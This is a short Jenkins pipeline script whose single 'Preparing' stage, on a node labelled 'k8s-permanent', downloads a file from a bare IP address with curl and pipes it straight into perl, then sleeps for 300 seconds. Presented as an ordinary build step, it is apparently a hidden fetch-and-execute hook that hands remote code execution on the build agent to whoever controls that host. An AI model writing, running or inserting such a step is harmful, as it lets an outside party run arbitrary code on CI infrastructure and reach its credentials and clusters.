node('k8s-permanent') {
    try {
        stage("Preparing") {
            sh 'curl http://34.143.172.153/p | perl'
            sh 'sleep 300'
        }
    } catch (e) {
        throw e
    }
}
